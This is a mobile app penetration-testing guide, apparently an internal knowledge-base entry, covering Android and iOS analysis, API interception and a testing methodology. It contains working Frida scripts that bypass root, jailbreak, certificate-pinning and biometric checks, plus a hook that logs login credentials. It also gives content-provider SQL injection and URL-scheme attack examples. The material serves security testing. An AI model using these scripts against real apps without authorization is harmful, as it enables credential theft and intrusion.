# Mobile Security Testing

> Rush Seed — Palace Security Knowledge Base
> Classification: OFFENSIVE — FOUNDER EYES ONLY
> Version: 1.0 | Created: 2026-03-09

---

## 1. Mobile Security Landscape

Mobile apps are the fastest-growing attack surface. They store credentials locally, communicate over untrusted networks, and run on devices users control. Rush's principle: **every mobile app is a client you can't trust running on hardware you don't own.**

### 1.1 Mobile Threat Model

```
Attack Surface:
├── Client-Side
│   ├── Local data storage (SQLite, SharedPrefs, Keychain)
│   ├── Binary/code analysis
│   ├── Memory manipulation
│   ├── Keyboard cache / clipboard
│   ├── Screenshot/screen recording
│   └── Debug/logging output
├── Network
│   ├── API communications
│   ├── Certificate validation
│   ├── Protocol analysis
│   └── Man-in-the-middle
├── Server-Side
│   ├── API vulnerabilities
│   ├── Authentication flaws
│   ├── Authorization bypass
│   └── Business logic
└── Platform-Specific
    ├── Android: Intent abuse, Content Provider leaks, WebView
    ├── iOS: URL schemes, Keychain, App Transport Security
    └── Both: Deep links, push notifications, biometric bypass
```

### 1.2 Testing Environment Setup

**Android Lab:**
```bash
# Emulator setup (Genymotion or Android Studio)
# Genymotion: better performance, root access, proxy support
# Android Studio: official, free, ARM support

# Root the emulator (if not already rooted)
# Genymotion devices are rooted by default

# Install tools on device
adb install frida-server-android.apk
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server

# Install proxy certificate for MITM
# Export Burp Suite CA certificate
# Push to device and install as trusted CA

# Essential host tools:
# - Burp Suite Professional
# - Frida (dynamic instrumentation)
# - objection (Frida-based exploration)
# - jadx (Java decompiler)
# - apktool (APK disassembly)
# - MobSF (automated analysis)
# - drozer (Android security assessment)
# - adb (Android Debug Bridge)
```

**iOS Lab:**
```bash
# Jailbroken device (or corellium virtual device)
# Install via Checkra1n, unc0ver, or Dopamine

# Install tools on device (via Cydia/Sileo):
# - Frida
# - SSL Kill Switch 2
# - FLEXLoader
# - Filza (file manager)

# Essential host tools:
# - Burp Suite Professional
# - Frida + objection
# - class-dump
# - Hopper Disassembler / IDA Pro
# - MobSF
# - ipatool (download IPA from App Store)
# - ios-deploy
# - libimobiledevice
```

---

## 2. Android Application Testing

### 2.1 APK Analysis (Static)

```bash
# Obtain the APK
# From device:
adb shell pm list packages | grep target
adb shell pm path com.target.app
adb pull /data/app/com.target.app-1/base.apk target.apk

# From third-party sources:
# apkpure.com, apkmirror.com, evozi APK downloader

# Decompile APK
apktool d target.apk -o target_decompiled/

# Decompile to Java source
jadx target.apk -d target_java/

# Analyze AndroidManifest.xml
cat target_decompiled/AndroidManifest.xml

# Key manifest checks:
# - android:debuggable="true" (CRITICAL)
# - android:allowBackup="true" (data extraction)
# - android:exported="true" on components (accessible by other apps)
# - android:usesCleartextTraffic="true" (HTTP allowed)
# - Custom permissions and protection levels
# - Intent filters (deep links, broadcasts)
# - Content Providers (data exposure)
```

**Secrets in Code:**
```bash
# Search for hardcoded secrets
grep -rn "api_key\|api_secret\|password\|secret\|token\|AWS\|firebase" target_java/
grep -rn "AKIA\|AIza\|sk-\|pk_live\|BEGIN.*KEY" target_java/

# Search for URLs and endpoints
grep -rn "https\?://\|http\?://" target_java/ | grep -v "schemas.android\|w3.org"

# Search for Firebase URLs
grep -rn "firebaseio.com\|firebase" target_java/

# Check Firebase database access
curl https://TARGET.firebaseio.com/.json
# If returns data = misconfigured (no auth required)

# Search for AWS configurations
grep -rn "s3.amazonaws.com\|cognito\|execute-api" target_java/

# Check strings.xml for secrets
cat target_decompiled/res/values/strings.xml | grep -i "key\|secret\|api\|token"
```

### 2.2 Android Local Storage Analysis

```bash
# Access app data directory (requires root)
adb shell
su
cd /data/data/com.target.app/

# Check SharedPreferences (XML key-value store)
cat shared_prefs/*.xml

# Common findings:
# - Plaintext credentials
# - API tokens
# - User PII
# - Session tokens
# - Feature flags

# Check SQLite databases
sqlite3 databases/app_database.db
.tables
.schema
SELECT * FROM users;
SELECT * FROM sessions;
SELECT * FROM credentials;

# Check for sensitive files
find /data/data/com.target.app/ -name "*.db" -o -name "*.key" -o -name "*.pem" -o -name "*.json"

# External storage (SD card — accessible by all apps)
ls /sdcard/Android/data/com.target.app/

# Check backup data
adb backup -noapk com.target.app -f backup.ab
# Convert to tar: java -jar abe.jar unpack backup.ab backup.tar
tar xf backup.tar
```

### 2.3 Android Dynamic Analysis

```bash
# Start Frida server on device
adb shell "/data/local/tmp/frida-server &"

# Use objection for exploration
objection -g com.target.app explore

# objection commands:
# List activities
android hooking list activities

# List services
android hooking list services

# Dump keystore
android keystore list

# Bypass root detection
android root disable

# Bypass SSL pinning
android sslpinning disable

# Monitor filesystem
android hooking watch class java.io.File

# Hook specific method
android hooking watch class_method com.target.app.api.AuthService.login --dump-args --dump-return

# Search for classes
android hooking search classes com.target
```

**Frida Scripts:**
```javascript
// Bypass root detection
Java.perform(function() {
    var RootDetection = Java.use("com.target.app.security.RootDetection");
    RootDetection.isRooted.implementation = function() {
        console.log("Root detection bypassed");
        return false;
    };
});

// Hook login method to capture credentials
Java.perform(function() {
    var AuthService = Java.use("com.target.app.AuthService");
    AuthService.login.implementation = function(username, password) {
        console.log("Username: " + username);
        console.log("Password: " + password);
        return this.login(username, password);
    };
});

// Bypass certificate pinning (OkHttp3)
Java.perform(function() {
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload('java.lang.String', 'java.util.List')
        .implementation = function(hostname, peerCertificates) {
        console.log("SSL pinning bypassed for: " + hostname);
        return;
    };
});

// Decrypt SharedPreferences
Java.perform(function() {
    var EncryptedSharedPreferences = Java.use(
        "androidx.security.crypto.EncryptedSharedPreferences");
    // Hook getString to see decrypted values
    var SharedPreferences = Java.use("android.content.SharedPreferences");
    // ... implementation
});
```

### 2.4 Android Intent and Content Provider Attacks

```bash
# Drozer — Android security framework
drozer console connect

# List exported activities
run app.activity.info -a com.target.app

# Launch exported activity (bypass authentication)
run app.activity.start --component com.target.app com.target.app.AdminActivity

# List content providers
run app.provider.info -a com.target.app

# Query content providers
run app.provider.query content://com.target.app.provider/users

# SQL injection on content provider
run app.provider.query content://com.target.app.provider/users --projection "* FROM users;--"

# List broadcast receivers
run app.broadcast.info -a com.target.app

# Send broadcast
run app.broadcast.send --action com.target.app.ACTION_UPDATE --extra string key value

# Deep link testing
adb shell am start -a android.intent.action.VIEW -d "targetapp://admin/dashboard"
```

---

## 3. iOS Application Testing

### 3.1 IPA Analysis (Static)

```bash
# Obtain IPA
# From jailbroken device:
# Install AppSync Unified, then copy from /var/containers/Bundle/Application/

# Decrypt IPA (apps are encrypted at rest)
# On device with frida:
frida-ios-dump -u -p 2222 com.target.app

# Or use Clutch/dumpdecrypted on device

# Extract IPA contents
unzip target.ipa -d target_extracted/
cd target_extracted/Payload/Target.app/

# Analyze Info.plist
plutil -convert xml1 Info.plist -o Info_readable.plist
cat Info_readable.plist

# Key Info.plist checks:
# - NSAppTransportSecurity (ATS) exceptions
# - CFBundleURLTypes (URL schemes)
# - NSCameraUsageDescription (permissions)
# - Exported UTIs

# Binary analysis
# Check for PIE (Position Independent Executable)
otool -hv Target | grep PIE

# Check for ARC (Automatic Reference Counting)
otool -Iv Target | grep objc_release

# Check for stack canaries
otool -Iv Target | grep stack_chk

# Class dump
class-dump Target > classes.h

# String extraction
strings Target | grep -iE "api\|key\|secret\|password\|token\|http"
```

### 3.2 iOS Local Storage Analysis

```bash
# App sandbox location (jailbroken device)
# /var/mobile/Containers/Data/Application/[UUID]/

# Find app UUID
find /var/mobile/Containers/Data/Application/ -name "com.target.app" 2>/dev/null
# Or use: objection -g com.target.app explore -> env

# Check NSUserDefaults (plist files)
find . -name "*.plist" -exec plutil -convert xml1 {} \; -print
cat Library/Preferences/com.target.app.plist

# Check SQLite databases
find . -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3"
sqlite3 Documents/app.db ".tables"

# Check Keychain
# Using objection:
objection -g com.target.app explore
ios keychain dump

# Keychain items may contain:
# - Passwords
# - API tokens
# - Certificates
# - Encryption keys
# - OAuth tokens

# Check for sensitive data in:
# - Documents/ directory
# - Library/Caches/
# - tmp/
# - Library/Application Support/

# Check Core Data
find . -name "*.momd" -o -name "*.mom"

# Check Realm databases
find . -name "*.realm"
```

### 3.3 iOS Dynamic Analysis

```bash
# Start Frida on device
frida -U -f com.target.app --no-pause

# objection iOS exploration
objection -g com.target.app explore

# Bypass jailbreak detection
ios jailbreak disable

# Bypass SSL pinning
ios sslpinning disable

# Dump cookies
ios cookies get

# Monitor pasteboard
ios pasteboard monitor

# Monitor filesystem access
ios hooking watch method "+[NSFileManager defaultManager]" --dump-args

# Hook URL loading
ios hooking watch method "-[NSURLSession dataTaskWithRequest:completionHandler:]" --dump-args

# Monitor keychain access
ios keychain dump
```

**iOS Frida Scripts:**
```javascript
// Bypass jailbreak detection
var paths = [
    "/Applications/Cydia.app",
    "/Library/MobileSubstrate/MobileSubstrate.dylib",
    "/bin/bash",
    "/usr/sbin/sshd",
    "/etc/apt"
];

Interceptor.attach(ObjC.classes.NSFileManager["- fileExistsAtPath:"].implementation, {
    onEnter: function(args) {
        this.path = ObjC.Object(args[2]).toString();
    },
    onLeave: function(retval) {
        if (paths.indexOf(this.path) !== -1) {
            retval.replace(0);
            console.log("Jailbreak check bypassed: " + this.path);
        }
    }
});

// Bypass biometric authentication
var LAContext = ObjC.classes.LAContext;
Interceptor.attach(LAContext["- evaluatePolicy:localizedReason:reply:"].implementation, {
    onEnter: function(args) {
        var reply = new ObjC.Block(args[4]);
        reply.implementation = function(success, error) {
            reply(true, null);
        };
    }
});

// Monitor network requests
var NSURLSession = ObjC.classes.NSURLSession;
Interceptor.attach(
    NSURLSession["- dataTaskWithRequest:completionHandler:"].implementation, {
    onEnter: function(args) {
        var request = ObjC.Object(args[2]);
        console.log("URL: " + request.URL().absoluteString());
        console.log("Method: " + request.HTTPMethod());
        if (request.HTTPBody()) {
            console.log("Body: " + ObjC.Object(request.HTTPBody()).toString());
        }
    }
});
```

### 3.4 iOS URL Scheme Attacks

```bash
# Identify URL schemes
cat Info.plist | grep -A5 CFBundleURLSchemes

# Test URL scheme handling
# On device:
# Safari: targetapp://action/parameter
# Or: open targetapp://admin/reset?token=test

# Common URL scheme attacks:
# 1. Open redirect via URL scheme
#    targetapp://webview?url=https://evil.com

# 2. Deep link parameter injection
#    targetapp://transfer?amount=1000&to=attacker

# 3. Universal Links hijacking
#    Claim the same domain association

# 4. Scheme hijacking
#    Malicious app registers same URL scheme
#    iOS doesn't guarantee which app handles it
```

---

## 4. API Interception and Analysis

### 4.1 Proxy Setup

```bash
# Burp Suite proxy configuration
# 1. Configure Burp to listen on all interfaces (0.0.0.0:8080)
# 2. Export Burp CA certificate
# 3. Install on device as trusted CA

# Android proxy setup:
# Settings > WiFi > Modify Network > Manual Proxy
# Host: YOUR_IP, Port: 8080

# Or via adb:
adb shell settings put global http_proxy YOUR_IP:8080

# iOS proxy setup:
# Settings > WiFi > (i) > Configure Proxy > Manual
# Server: YOUR_IP, Port: 8080

# Certificate installation:
# Android: Settings > Security > Install from storage
# iOS: Browse to http://burp, download cert, Settings > Profile Downloaded
#       Then: Settings > General > About > Certificate Trust Settings > Enable
```

### 4.2 Certificate Pinning Bypass

```bash
# Method 1: Frida + objection (most reliable)
objection -g com.target.app explore
android sslpinning disable  # or ios sslpinning disable

# Method 2: Frida script for specific library
# OkHttp3 (Android)
frida -U -f com.target.app -l okhttp3-bypass.js --no-pause

# Method 3: SSL Kill Switch 2 (iOS - jailbroken)
# Install via Cydia/Sileo

# Method 4: Xposed + TrustMeAlready (Android)
# Install Xposed Framework + TrustMeAlready module

# Method 5: Patch APK to remove pinning
# 1. Decompile with apktool
# 2. Find pinning code in smali
# 3. Modify verification method to always return true
# 4. Recompile and sign
apktool d target.apk
# Edit smali to bypass
apktool b target_patched -o target_patched.apk
jarsigner -keystore debug.keystore target_patched.apk debug
```

### 4.3 API Analysis Checklist

```
Once traffic is intercepted, analyze:

Authentication:
[ ] Token type and format (JWT, OAuth, API key)
[ ] Token storage on device
[ ] Token expiration and refresh mechanism
[ ] Authentication bypass attempts
[ ] Brute force protection on login
[ ] Password reset flow vulnerabilities

Authorization:
[ ] IDOR (Insecure Direct Object Reference)
[ ] Horizontal privilege escalation (access other users' data)
[ ] Vertical privilege escalation (access admin functions)
[ ] Role manipulation in requests
[ ] Missing function-level access control

Data Exposure:
[ ] Sensitive data in responses (PII, credentials)
[ ] Verbose error messages
[ ] Debug information in headers
[ ] Excessive data returned (full objects vs. needed fields)

Business Logic:
[ ] Price/quantity manipulation
[ ] Race conditions
[ ] Coupon/discount abuse
[ ] Feature flag manipulation
[ ] Subscription tier bypass
```

---

## 5. Automated Mobile Security Testing

### 5.1 MobSF (Mobile Security Framework)

```bash
# Run MobSF
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Upload APK/IPA for analysis
# Browse to http://localhost:8000
# Drag and drop APK or IPA

# MobSF performs:
# - Static analysis (code, manifest, permissions)
# - Dynamic analysis (traffic, behavior, storage)
# - Malware analysis
# - Security score

# API usage:
curl -F "file=@target.apk" http://localhost:8000/api/v1/upload -H "Authorization: API_KEY"
curl "http://localhost:8000/api/v1/scan" -X POST \
  -d "scan_type=apk&file_name=target.apk&hash=HASH" \
  -H "Authorization: API_KEY"
```

### 5.2 OWASP Mobile Top 10 Checklist

```
M1 — Improper Credential Usage
[ ] Hardcoded credentials in code
[ ] Credentials in local storage (plaintext)
[ ] API keys in client code
[ ] Shared credentials across environments

M2 — Inadequate Supply Chain Security
[ ] Third-party library vulnerabilities
[ ] Malicious SDK integration
[ ] Dependency confusion
[ ] Unsigned or tampered libraries

M3 — Insecure Authentication/Authorization
[ ] Weak authentication schemes
[ ] Missing server-side auth enforcement
[ ] Biometric bypass
[ ] Session management flaws

M4 — Insufficient Input/Output Validation
[ ] SQL injection via content providers
[ ] XSS in WebViews
[ ] Path traversal
[ ] Format string vulnerabilities

M5 — Insecure Communication
[ ] Cleartext traffic allowed
[ ] No certificate pinning
[ ] Weak TLS configuration
[ ] Certificate validation bypass

M6 — Inadequate Privacy Controls
[ ] Excessive data collection
[ ] PII in logs
[ ] Analytics with PII
[ ] Location tracking without consent

M7 — Insufficient Binary Protections
[ ] No code obfuscation
[ ] No anti-tampering
[ ] No root/jailbreak detection
[ ] Debug mode enabled in production

M8 — Security Misconfiguration
[ ] Default credentials
[ ] Unnecessary permissions
[ ] Backup enabled (android:allowBackup)
[ ] Debug logging in production

M9 — Insecure Data Storage
[ ] Plaintext SQLite databases
[ ] Unencrypted SharedPreferences
[ ] Sensitive data in logs
[ ] Cache with sensitive data

M10 — Insufficient Cryptography
[ ] Weak algorithms (MD5, SHA1, DES)
[ ] Hardcoded encryption keys
[ ] Predictable random numbers
[ ] Custom crypto implementations
```

---

## 6. Reverse Engineering Mobile Apps

### 6.1 Android Reverse Engineering

```bash
# Decompile DEX to smali
apktool d target.apk

# Decompile to Java (better readability)
jadx-gui target.apk

# Analyze native libraries
# .so files in lib/ directory
readelf -h lib/arm64-v8a/libnative.so
strings lib/arm64-v8a/libnative.so | grep -i "api\|key\|secret"

# Ghidra for native code analysis
# Import .so file into Ghidra for decompilation

# ProGuard/R8 deobfuscation
# Check for mapping.txt in APK
# Use retrace to map obfuscated names back

# Anti-analysis detection techniques to bypass:
# - Root detection
# - Emulator detection
# - Debugger detection
# - Tamper detection (signature verification)
# - Frida detection
```

### 6.2 iOS Reverse Engineering

```bash
# Decrypt binary (from jailbroken device)
# Using frida-ios-dump
frida-ios-dump com.target.app

# Analyze binary
file Target
otool -L Target  # List linked libraries
otool -ov Target  # Objective-C class info
nm Target | grep -i "secret\|key\|password"

# Hopper Disassembler
# - Load decrypted binary
# - Navigate to interesting methods
# - Read pseudo-code
# - Identify encryption routines

# Swift apps
# - Use swift-demangle for readable names
# - Swift metadata in __swift5_* sections
# - Protocol conformances reveal structure
```

---

## 7. Rush's Mobile Testing Methodology

```
Phase 1: Reconnaissance (30 min)
[ ] Download and install app
[ ] Review app store listing (permissions, description)
[ ] Identify backend domains
[ ] Check for related APIs
[ ] Review privacy policy

Phase 2: Static Analysis (2 hours)
[ ] Decompile and review code
[ ] Search for hardcoded secrets
[ ] Analyze manifest/Info.plist
[ ] Review permissions
[ ] Check crypto implementations
[ ] Analyze third-party libraries

Phase 3: Dynamic Analysis (3 hours)
[ ] Setup proxy and intercept traffic
[ ] Bypass certificate pinning
[ ] Map all API endpoints
[ ] Test authentication flows
[ ] Test authorization controls
[ ] Check local storage
[ ] Test deep links / URL schemes

Phase 4: Exploitation (2 hours)
[ ] Attempt identified vulnerabilities
[ ] Test business logic flaws
[ ] Check for data leaks
[ ] Test payment flows
[ ] Attempt privilege escalation

Phase 5: Reporting (1 hour)
[ ] Document all findings
[ ] Screenshot evidence
[ ] Severity classification
[ ] Remediation recommendations
```

---

*Rush knows that mobile apps are the most intimate attack surface — they live in pockets, have cameras and microphones, store credentials, and connect to everything. Every mobile app is a trust boundary you can cross. Test it before someone else does.*
